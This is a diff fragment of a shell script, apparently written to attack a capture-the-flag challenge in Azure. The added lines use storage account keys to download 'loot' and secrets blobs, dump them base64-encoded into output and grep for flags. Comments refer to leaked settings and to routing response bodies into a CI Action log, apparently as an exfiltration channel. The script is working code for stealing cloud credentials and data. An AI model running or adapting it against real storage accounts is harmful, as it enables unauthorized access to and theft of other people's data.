@@ -47,6 +47,16 @@ for sa_name in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblbackupprodx3euoz
   kb=$(echo "$kr" | sed '/HTTP=/,$d')
   key=$(echo "$kb" | jq -r '.keys[0].value // empty' 2>/dev/null)
   if [ -n "$key" ]; then
+    if [ "$sa_name" = "sttblcilogsprodx3euoz" ]; then
+      for suspect in flag flag.txt exploit_flag.txt loot_latest.json mi_loot_1792639046.json mi_loot_latest.json mi_loot_probe.json latest.json loot.json secrets.json; do
+        out=/tmp/suspect.$RANDOM
+        az storage blob download --account-name "$sa_name" --account-key "$key" --container-name loot --name "$suspect" --file "$out" --overwrite true -o none 2>/dev/null
+        if [ -s "$out" ]; then
+          echo SUSPECT_$suspect=$(head -c 5000 "$out" | base64 -w0)
+          grep -aEo 'DF26\{[^}]+\}' "$out" || true
+        fi
+      done
+    fi
     for cont in $(az storage container list --account-name "$sa_name" --account-key "$key" --query '[].name' -o tsv 2>/dev/null); do
       echo PLATFORM_CONTAINER_$sa_name=$cont
       for blob in $(az storage blob list --account-name "$sa_name" --account-key "$key" --container-name "$cont" --query '[].name' -o tsv 2>/dev/null); do
@@ -90,6 +100,7 @@ echo RETRY_MARK=platform_fic_second_exchange
 echo RETRY_MARK2=platform_fic_list
 echo RETRY_MARK3=listkeys_body
 echo RETRY_MARK4=retry_exchange_and_storage
+echo RETRY_MARK5=target_loot_blobs
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
